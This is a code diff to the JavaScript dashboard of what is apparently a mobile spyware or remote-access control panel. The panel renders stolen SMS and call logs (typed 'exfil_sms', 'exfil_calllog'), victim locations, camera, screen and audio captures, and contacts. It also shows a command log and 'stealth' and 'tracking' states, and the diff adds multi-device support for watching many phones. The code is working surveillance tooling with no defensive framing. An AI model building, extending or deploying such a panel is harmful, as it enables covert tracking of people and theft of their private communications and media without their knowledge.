-      media=`<div style="height:160px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#4cc9f0;font-size:12px;background:#0f0f23;gap:4px;" onclick="showLocation('${encodeURIComponent(c.data||'')}')"><div style="font-size:28px;">📍</div><div>Tap to view</div></div>`;
+      media='<div style="height:160px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#4cc9f0;font-size:12px;background:#0f0f23;gap:4px;" onclick="showLocation(\\''+encodeURIComponent(c.data||'')+'\\')"><div style="font-size:28px;">📍</div><div>Tap to view</div></div>';
     } else if (c.type==='exfil_sms'||c.type==='exfil_calllog') {
-      const preview=c.data||'';
-      media=`<div style="height:160px;overflow:auto;padding:8px;font-size:11px;font-family:monospace;background:#0f0f23;color:#576574;white-space:pre-wrap;cursor:pointer;" onclick="showJson('${encodeURIComponent(c.data||'')}')">${preview.length>300?preview.slice(0,300)+'...':preview||'No data'}</div>`;
+      var preview=c.data||'';
+      media='<div style="height:160px;overflow:auto;padding:8px;font-size:11px;font-family:monospace;background:#0f0f23;color:#576574;white-space:pre-wrap;cursor:pointer;" onclick="showJson(\\''+encodeURIComponent(c.data||'')+'\\')">'+(preview.length>300?preview.slice(0,300)+'...':preview||'No data')+'</div>';
     } else if (src&&(c.type==='camera'||c.type==='screen')) {
-      media=`<img class="thumb" src="${src}" loading="lazy" onclick="window.open('${src}','_blank')" style="cursor:pointer" />`;
+      media='<img class="thumb" src="'+src+'" loading="lazy" onclick="window.open(\\''+src+'\\',\\'_blank\\')" style="cursor:pointer" />';
     } else if (src&&c.type==='audio') {
-      media=`<div class="audio-preview"><audio controls src="${src}"></audio></div>`;
+      media='<div class="audio-preview"><audio controls src="'+src+'"></audio></div>';
     } else {
-      media=`<div style="height:160px;display:flex;align-items:center;justify-content:center;color:#576574;font-size:11px;">No preview</div>`;
+      media='<div style="height:160px;display:flex;align-items:center;justify-content:center;color:#576574;font-size:11px;">No preview</div>';
     }
-    const driveBadge=c.drive_url?'<span style="font-size:10px"> Drive</span>':'';
-    const dlBtn=src?`<button class="btn" onclick="downloadFile('${src}','${c.type}')" style="padding:2px 8px;font-size:10px;">Download</button>`:(
+    var driveBadge=c.drive_url?' Drive':'';
+    var dlBtn=src?'<button class="btn" onclick="downloadFile(\\''+src+'\\',\\''+c.type+'\\')" style="padding:2px 8px;font-size:10px;">Download</button>':(
       (c.type==='exfil_sms'||c.type==='exfil_calllog'||c.type==='surveillance_location')?
-      `<button class="btn" onclick="downloadJson('${encodeURIComponent(c.data||'')}','${c.type}')" style="padding:2px 8px;font-size:10px;">Download</button>`:'');
-    return `<div class="capture-item">${media}<div class="info"><span><span class="tag">${c.type}${driveBadge}</span></span><span class="time">${c.time.slice(11,19)} ${dlBtn}</span></div></div>`;
+      '<button class="btn" onclick="downloadJson(\\''+encodeURIComponent(c.data||'')+'\\',\\''+c.type+'\\')" style="padding:2px 8px;font-size:10px;">Download</button>':'');
+    var devTag=c.device?'<span style="font-size:9px;background:#0f3460;color:#576574;padding:0 4px;border-radius:2px;margin-right:4px;">'+(c.device||'').substring(0,8)+'...</span>':'';
+    return '<div class="capture-item">'+media+'<div class="info"><span>'+devTag+'<span class="tag">'+c.type+driveBadge+'</span></span><span class="time">'+c.time.slice(11,19)+' '+dlBtn+'</span></div></div>';
   }).join('')+'</div>';
 }
 
@@ -869,16 +1010,17 @@ function renderContacts() {
   const filtered=q?ALL_CONTACTS.filter(c=>c.name.toLowerCase().includes(q)||c.phone.includes(q)||c.email.toLowerCase().includes(q)):ALL_CONTACTS;
   if (!filtered.length) { el.innerHTML='<div class="empty-state">No contacts'+(q?' matching "'+q+'"':'')+'</div>'; return; }
   el.innerHTML='<div class="contact-row">'+filtered.map(c=>
-    `<div class="contact-chip"><span class="name">${c.name}</span> <span class="detail">${c.phone}${c.email?' · '+c.email:''}</span></div>`
+    '<div class="contact-chip"><span class="name">'+c.name+'</span> <span class="detail">'+c.phone+(c.email?' · '+c.email:'')+'</span></div>'
   ).join('')+'</div>';
 }
 
 function renderCommands(cmds) {
   const el=document.getElementById('cmdlog');
   if (!cmds.length) { el.innerHTML='<div class="empty-state">No commands yet</div>'; return; }
-  el.innerHTML='<div class="cmd-list">'+cmds.map(c=>
-    `<div class="cmd-row"><span class="act">${c.action}</span><span class="tgt">${c.target}</span><span class="status ${c.status}">${c.status}</span>${c.result?`<span class="res">${c.result}</span>`:''}<span class="time">${c.time.slice(11,19)}</span></div>`
-  ).join('')+'</div>';
+  el.innerHTML='<div class="cmd-list">'+cmds.map(c=>{
+    var devTag=c.device?'<span style="font-size:9px;background:#0f3460;color:#576574;padding:0 4px;border-radius:2px;">'+(c.device||'').substring(0,8)+'...</span>':'<span style="font-size:9px;background:#16213e;color:#feca57;padding:0 4px;border-radius:2px;">ALL</span>';
+    return '<div class="cmd-row">'+devTag+'<span class="act">'+c.action+'</span><span class="tgt">'+c.target+'</span><span class="status '+c.status+'">'+c.status+'</span>'+(c.result?'<span class="res">'+c.result+'</span>':'')+'<span class="time">'+c.time.slice(11,19)+'</span></div>';
+  }).join('')+'</div>';
 }
 
 function renderAlerts(alerts) {
@@ -889,26 +1031,34 @@ function renderAlerts(alerts) {
   if (!alerts.length) { el.innerHTML='<div class="empty-state">No alerts yet</div>'; return; }
   el.innerHTML='<div class="cmd-list">'+alerts.map(a=> {
     const isMotion=a.type==='MOTION_DETECTED';
-    return `<div class="cmd-row" style="${isMotion?'background:#16213e;':''}"><span class="act" style="background:${isMotion?'#e94560':'#16213e'};color:#fff;">${a.type}</span><span class="tgt" style="min-width:0;">${a.message}</span><span style="color:#576574;font-size:10px;">${a.source}</span><span class="time">${a.time.slice(11,19)}</span></div>`;
+    var devTag=a.device_id?'<span style="font-size:9px;background:#0f3460;color:#576574;padding:0 4px;border-radius:2px;">'+(a.device_id||'').substring(0,8)+'...</span>':'';
+    return '<div class="cmd-row" style="'+(isMotion?'background:#16213e;':'')+'">'+devTag+'<span class="act" style="background:'+(isMotion?'#e94560':'#16213e')+';color:#fff;">'+a.type+'</span><span class="tgt" style="min-width:0;">'+a.message+'</span><span style="color:#576574;font-size:10px;">'+a.source+'</span><span class="time">'+a.time.slice(11,19)+'</span></div>';
   }).join('')+'</div>';
 }
 
 async function fetchData() {
   try {
-    const [dataR, statusR]=await Promise.all([
+    const [dataR, statusR, devicesR]=await Promise.all([
       fetch('/api/data'),
-      fetch('/api/status')
+      fetch('/api/status'),
+      fetch('/api/devices')
     ]);
     const d=await dataR.json();
     const s=await statusR.json();
+    const devicesData=await devicesR.json();
     const caps=d.captures||[];
     const conts=d.contacts||[];
     const cmds=d.commands||[];
     const alerts=d.alerts||[];
+    const devs=devicesData.devices||[];
 
+    ALL_DEVICES = devs;
     document.getElementById('capture-count').textContent=caps.length;
     document.getElementById('contact-count').textContent=conts.length;
 
+    renderDevices(devs);
+    renderHeaderPills();
+    renderTargetBar();
     RENDERED_CAPS=caps;
     renderCaptures(caps);
 
@@ -918,7 +1068,6 @@ async function fetchData() {
     renderCommands(cmds);
     renderAlerts(alerts);
 
-    // surveillance state from /api/status
     const svEl=document.getElementById('surveillance-status');
     if (s.surveillance) {
       svEl.textContent='ACTIVE'; svEl.style.color='#10ac84'; svEl.style.background='rgba(16,172,132,0.2)';
@@ -931,36 +1080,47 @@ async function fetchData() {
       document.getElementById('motion-state').textContent='Off';
       document.getElementById('motion-state').style.color='#576574';
     }
-    // tracking from /api/status
     const trEl=document.getElementById('tracking-state');
     trEl.textContent=s.tracking?'Active':'Off';
     trEl.style.color=s.tracking?'#10ac84':'#576574';
-    // stealth from /api/status
     const stEl=document.getElementById('stealth-state');
     stEl.textContent=s.stealth?'Active':'Off';
     stEl.style.color=s.stealth?'#feca57':'#576574';
 
     const types={};
     caps.forEach(c=>{types[c.type]=(types[c.type]||0)+1});
+    var onlineC=devs.filter(d=>d.online).length;
     document.getElementById('stats').innerHTML=
-      Object.entries(types).map(([k,v])=>`<div class="stat-card"><div class="num">${v}</div><div class="label">${k}</div></div>`).join('')
-      +`<div class="stat-card"><div class="num">${conts.length}</div><div class="label">Contacts</div></div>`
-      +`<div class="stat-card"><div class="num">${cmds.length}</div><div class="label">Commands</div></div>`
-      +`<div class="stat-card"><div class="num">${alerts.length}</div><div class="label">Alerts</div></div>`;
-
-    const dot=document.getElementById('status-dot');
-    const txt=document.getElementById('status-text');
-    dot.className='dot '+(s.device?'online':'offline');
-    txt.textContent=s.device?'Device Online':'Waiting for device';
+      '<div class="stat-card"><div class="num">'+devs.length+'</div><div class="label">Devices ('+onlineC+' on)</div></div>'
+      +Object.entries(types).map(([k,v])=>'<div class="stat-card"><div class="num">'+v+'</div><div class="label">'+k+'</div></div>').join('')
+      +'<div class="stat-card"><div class="num">'+conts.length+'</div><div class="label">Contacts</div></div>'
+      +'<div class="stat-card"><div class="num">'+cmds.length+'</div><div class="label">Commands</div></div>'
+      +'<div class="stat-card"><div class="num">'+alerts.length+'</div><div class="label">Alerts</div></div>';
   } catch(e) {
-    document.getElementById('status-dot').className='dot offline';
-    document.getElementById('status-text').textContent='Disconnected';
+    document.getElementById('stats').innerHTML='<div class="stat-card" style="grid-column:1/-1;"><div class="num" style="color:#e94560;font-size:14px;">Backend Error</div><div class="label">'+e.message+'</div></div>';
   }
 }
 
 fetchData();
 setInterval(fetchData, 3000);
 setInterval(updateMotionCount, 2000);
+
+setInterval(async function() {
+  try {
+    const r = await fetch('/api/status', {signal: AbortSignal.timeout(3000)});
+    const el = document.getElementById('backend-status');
+    if (r.ok) {
+      el.innerHTML='<span class="dot online" style="width:7px;height:7px;border-radius:50%;background:#10ac84;display:inline-block;"></span>Backend Connected';
+      el.style.borderColor='#10ac84'; el.style.color='#10ac84'; el.style.background='rgba(16,172,132,0.1)';
+    } else throw 'bad';
+  } catch(_) {
+    const el = document.getElementById('backend-status');
+    if(el) {
+      el.innerHTML='<span class="dot offline" style="width:7px;height:7px;border-radius:50%;background:#e94560;display:inline-block;"></span>Backend Offline';
+      el.style.borderColor='#e94560'; el.style.color='#e94560'; el.style.background='rgba(233,69,96,0.1)';
+    }
+  }
+}, 5000);
 
 let liveCamInterval=null;
 let liveCamBlobUrl=null;
@@ -1151,7 +1311,7 @@ const origSwitchTab=switchTab;
 switchTab=function(name) {
   origSwitchTab(name);
   if (name==='screen') startScreenFeed();
-  else stopScreenFeed();
+  else { if(screenInterval) { clearInterval(screenInterval); screenInterval=null; } }
 };
 
 async function clearAll() {
